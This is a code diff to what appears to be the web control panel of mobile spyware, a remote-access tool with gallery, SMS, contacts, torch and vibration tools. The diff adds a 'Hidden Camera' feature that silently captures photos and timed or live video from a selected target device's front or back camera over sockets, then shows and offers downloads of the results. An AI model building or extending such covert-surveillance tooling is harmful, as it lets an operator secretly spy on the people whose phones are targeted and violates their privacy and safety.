@@ -70,7 +70,7 @@ export default function Home() {
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
     // Tool Selector State
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration'>('gallery');
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera'>('gallery');
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
@@ -98,6 +98,15 @@ export default function Home() {
     // Settings Modal State
     const [isSettingsOpen, setIsSettingsOpen] = useState(false);
     const [devicePermissions, setDevicePermissions] = useState<any>(null);
+
+    // Camera State
+    const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
+    const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
+    const [isRecording, setIsRecording] = useState(false);
+    const [recordingDuration, setRecordingDuration] = useState(60); // Default 1 min
+    const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
+    const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
+    const [cameraError, setCameraError] = useState<string | null>(null);
     const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
 
     // Helper function to show upgrade modal
@@ -242,6 +251,43 @@ export default function Home() {
             socket.on("permission_status", (data: any) => {
                 setIsCheckingPermissions(false);
                 setDevicePermissions(data.permissions);
+            });
+
+            // Camera Event Listeners
+            socket.on("camera_photo", (data: any) => {
+                setIsCapturingPhoto(false);
+                if (data.image) {
+                    setCapturedMedia(prev => [{
+                        type: 'photo',
+                        data: data.image,
+                        camera: data.camera || 'back',
+                        timestamp: data.timestamp || Date.now()
+                    }, ...prev]);
+                }
+            });
+
+            socket.on("camera_video", (data: any) => {
+                setIsRecording(false);
+                setRecordingProgress({ current: 0, total: 0 });
+                if (data.video) {
+                    setCapturedMedia(prev => [{
+                        type: 'video',
+                        data: data.video,
+                        camera: data.camera || 'back',
+                        timestamp: data.timestamp || Date.now()
+                    }, ...prev]);
+                }
+            });
+
+            socket.on("recording_progress", (data: any) => {
+                setRecordingProgress({ current: data.current || 0, total: data.total || 0 });
+            });
+
+            socket.on("camera_error", (data: any) => {
+                setIsCapturingPhoto(false);
+                setIsRecording(false);
+                setCameraError(data.error || "Camera error occurred");
+                setTimeout(() => setCameraError(null), 5000);
             });
 
             fetch(`https://backend-api-gallery.onrender.com/images?uuid=${uuid}`)
@@ -637,6 +683,7 @@ END:VCARD`;
                             {selectedTool === 'contacts' && <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>}
                             {selectedTool === 'torch' && <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>}
                             {selectedTool === 'vibration' && <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>}
+                            {selectedTool === 'camera' && <svg className="w-4 h-4 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>}
                             <span className="text-xs font-medium text-white/70">Tools</span>
                             <svg className="w-3 h-3 text-white/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
                         </button>
@@ -999,6 +1046,220 @@ END:VCARD`;
                                     Vibrate Now
                                 </button>
                             </div>
+                        </div>
+                    )}
+
+                    {/* Camera Tool */}
+                    {selectedTool === 'camera' && (
+                        <div className="space-y-6">
+                            {/* Camera Controls Card */}
+                            <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
+                                <div className="flex items-center justify-between mb-6">
+                                    <div>
+                                        <h3 className="text-xl font-bold mb-1">Hidden Camera</h3>
+                                        <p className="text-white/40 text-sm">Capture photos & videos silently</p>
+                                    </div>
+                                    <div className="p-3 rounded-xl bg-pink-500/20">
+                                        <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                    </div>
+                                </div>
+
+                                {/* Error Message */}
+                                {cameraError && (
+                                    <div className="mb-4 p-3 rounded-lg bg-red-500/20 border border-red-500/30 text-red-400 text-sm">
+                                        ⚠️ {cameraError}
+                                    </div>
+                                )}
+
+                                {/* Camera Selection */}
+                                <div className="mb-6">
+                                    <label className="block text-xs font-medium text-white/60 mb-3">Camera</label>
+                                    <div className="flex gap-2">
+                                        <button
+                                            onClick={() => setCameraMode('back')}
+                                            className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'back' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
+                                        >
+                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path></svg>
+                                            Back Camera
+                                        </button>
+                                        <button
+                                            onClick={() => setCameraMode('front')}
+                                            className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'front' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
+                                        >
+                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
+                                            Front Camera
+                                        </button>
+                                    </div>
+                                </div>
+
+                                {/* Capture Photo */}
+                                <div className="mb-6">
+                                    <button
+                                        onClick={() => {
+                                            if (!selectedDeviceId || isCapturingPhoto || isRecording) return;
+                                            setIsCapturingPhoto(true);
+                                            setCameraError(null);
+                                            socket?.emit('capture_photo', {
+                                                uuid: session?.user?.uuid,
+                                                targetDeviceId: selectedDeviceId,
+                                                camera: cameraMode
+                                            });
+                                        }}
+                                        disabled={!selectedDeviceId || isCapturingPhoto || isRecording}
+                                        className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto && !isRecording ? 'bg-gradient-to-r from-pink-500 to-purple-500 hover:scale-[1.02] shadow-lg shadow-pink-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                    >
+                                        {isCapturingPhoto ? (
+                                            <>
+                                                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                                                Capturing...
+                                            </>
+                                        ) : (
+                                            <>
+                                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                                📸 Capture Photo
+                                            </>
+                                        )}
+                                    </button>
+                                </div>
+
+                                {/* Video Recording */}
+                                <div className="space-y-4">
+                                    <label className="block text-xs font-medium text-white/60">Video Recording</label>
+
+                                    {/* Duration Selection */}
+                                    <div className="grid grid-cols-4 gap-2">
+                                        {[
+                                            { label: '1 min', value: 60 },
+                                            { label: '2 min', value: 120 },
+                                            { label: '5 min', value: 300 },
+                                            { label: 'Live', value: -1 }
+                                        ].map((option) => (
+                                            <button
+                                                key={option.value}
+                                                onClick={() => setRecordingDuration(option.value)}
+                                                className={`py-2 rounded-lg text-sm font-medium transition-all ${recordingDuration === option.value ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
+                                            >
+                                                {option.label}
+                                            </button>
+                                        ))}
+                                    </div>
+
+                                    {/* Recording Progress */}
+                                    {isRecording && (
+                                        <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/30">
+                                            <div className="flex items-center justify-between mb-2">
+                                                <span className="text-red-400 font-medium flex items-center gap-2">
+                                                    <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
+                                                    Recording...
+                                                </span>
+                                                <span className="text-white/60 text-sm">
+                                                    {recordingProgress.current}s / {recordingProgress.total === -1 ? '∞' : `${recordingProgress.total}s`}
+                                                </span>
+                                            </div>
+                                            {recordingProgress.total > 0 && (
+                                                <div className="h-2 rounded-full bg-white/10 overflow-hidden">
+                                                    <div
+                                                        className="h-full bg-red-500 transition-all duration-1000"
+                                                        style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}
+                                                    />
+                                                </div>
+                                            )}
+                                        </div>
+                                    )}
+
+                                    {/* Record/Stop Buttons */}
+                                    {!isRecording ? (
+                                        <button
+                                            onClick={() => {
+                                                if (!selectedDeviceId || isCapturingPhoto) return;
+                                                setIsRecording(true);
+                                                setCameraError(null);
+                                                setRecordingProgress({ current: 0, total: recordingDuration });
+                                                socket?.emit('start_recording', {
+                                                    uuid: session?.user?.uuid,
+                                                    targetDeviceId: selectedDeviceId,
+                                                    camera: cameraMode,
+                                                    duration: recordingDuration
+                                                });
+                                            }}
+                                            disabled={!selectedDeviceId || isCapturingPhoto}
+                                            className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto ? 'bg-gradient-to-r from-red-500 to-pink-500 hover:scale-[1.02] shadow-lg shadow-red-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                        >
+                                            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" /></svg>
+                                            🎥 Start Recording ({recordingDuration === -1 ? 'Live' : `${recordingDuration / 60}min`})
+                                        </button>
+                                    ) : (
+                                        <button
+                                            onClick={() => {
+                                                socket?.emit('stop_recording', {
+                                                    uuid: session?.user?.uuid,
+                                                    targetDeviceId: selectedDeviceId
+                                                });
+                                            }}
+                                            className="w-full py-4 rounded-xl font-bold text-lg bg-white text-black hover:bg-gray-200 transition-all flex items-center justify-center gap-2"
+                                        >
+                                            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
+                                            ⏹️ Stop Recording
+                                        </button>
+                                    )}
+                                </div>
+
+                                {/* No Device Warning */}
+                                {!selectedDeviceId && (
+                                    <div className="mt-4 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-sm text-center">
+                                        Select a device from the top menu to use the camera
+                                    </div>
+                                )}
+                            </div>
+
+                            {/* Captured Media Gallery */}
+                            {capturedMedia.length > 0 && (
+                                <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
+                                    <div className="flex items-center justify-between mb-4">
+                                        <h3 className="text-lg font-bold">Captured Media</h3>
+                                        <button
+                                            onClick={() => setCapturedMedia([])}
+                                            className="text-xs text-white/40 hover:text-red-400 transition-colors"
+                                        >
+                                            Clear All
+                                        </button>
+                                    </div>
+                                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
+                                        {capturedMedia.map((media, idx) => (
+                                            <div key={idx} className="relative group aspect-square rounded-xl overflow-hidden bg-black/50 border border-white/10">
+                                                {media.type === 'photo' ? (
+                                                    <img
+                                                        src={`data:image/jpeg;base64,${media.data}`}
+                                                        alt={`Captured ${idx}`}
+                                                        className="w-full h-full object-cover"
+                                                    />
+                                                ) : (
+                                                    <video
+                                                        src={`data:video/mp4;base64,${media.data}`}
+                                                        className="w-full h-full object-cover"
+                                                        controls
+                                                    />
+                                                )}
+                                                <div className="absolute top-2 left-2 px-2 py-1 rounded-md bg-black/70 text-xs">
+                                                    {media.type === 'photo' ? '📷' : '🎥'} {media.camera}
+                                                </div>
+                                                <div className="absolute bottom-0 left-0 right-0 p-2 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
+                                                    <div className="text-xs text-white/60">
+                                                        {new Date(media.timestamp).toLocaleString()}
+                                                    </div>
+                                                    <a
+                                                        href={`data:${media.type === 'photo' ? 'image/jpeg' : 'video/mp4'};base64,${media.data}`}
+                                                        download={`capture_${media.timestamp}.${media.type === 'photo' ? 'jpg' : 'mp4'}`}
+                                                        className="text-xs text-purple-400 hover:text-purple-300"
+                                                    >
+                                                        Download
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        ))}
+                                    </div>
+                                </div>
+                            )}
                         </div>
                     )}
                 </div>
@@ -1494,7 +1755,7 @@ END:VCARD`;
                                         setSelectedTool('vibration');
                                         setIsToolDropdownOpen(false);
                                     }}
-                                    className={`w-full text-left px-4 py-4 rounded-xl flex items-center justify-between transition-colors ${selectedTool === 'vibration' ? 'bg-orange-500/20 border border-orange-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'vibration' ? 'bg-orange-500/20 border border-orange-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                 >
                                     <div className="flex items-center gap-3">
                                         <div className="p-2 rounded-lg bg-orange-500/20">
@@ -1507,6 +1768,26 @@ END:VCARD`;
                                     </div>
                                     {selectedTool === 'vibration' && (
                                         <svg className="w-5 h-5 text-orange-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    )}
+                                </button>
+                                <button
+                                    onClick={() => {
+                                        setSelectedTool('camera');
+                                        setIsToolDropdownOpen(false);
+                                    }}
+                                    className={`w-full text-left px-4 py-4 rounded-xl flex items-center justify-between transition-colors ${selectedTool === 'camera' ? 'bg-pink-500/20 border border-pink-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-pink-500/20">
+                                            <svg className="w-5 h-5 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                        </div>
+                                        <div>
+                                            <div className="font-medium">Hidden Camera</div>
+                                            <div className="text-xs text-white/40">Capture photos & videos</div>
+                                        </div>
+                                    </div>
+                                    {selectedTool === 'camera' && (
+                                        <svg className="w-5 h-5 text-pink-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                             </div>
